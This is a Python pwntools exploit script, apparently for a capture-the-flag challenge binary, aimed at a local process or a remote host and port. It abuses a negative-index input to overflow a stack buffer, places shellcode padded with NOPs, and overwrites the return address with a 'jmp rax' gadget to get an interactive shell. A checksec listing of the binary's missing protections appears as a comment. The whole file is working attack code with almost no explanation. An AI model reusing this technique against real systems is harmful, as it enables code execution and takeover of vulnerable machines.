#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.87.66.171', 61008

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x401469
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX unknown - GNU_STACK missing
#     PIE:      No PIE (0x400000)
#     Stack:    Executable
#     RWX:      Has RWX segments

def exploit():
    global io
    io = initialize()

    jmp_rax = 0x000000000040111c
    shellcode = open("shellcode.bin", "rb").read()
    payload = shellcode
    payload += b'\x90' * (40 - len(payload))
    payload += p64(jmp_rax)

    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b'?', b'-1')
    io.sendlineafter(b':', payload)    

    io.interactive()
    
if __name__ == '__main__':
    exploit()
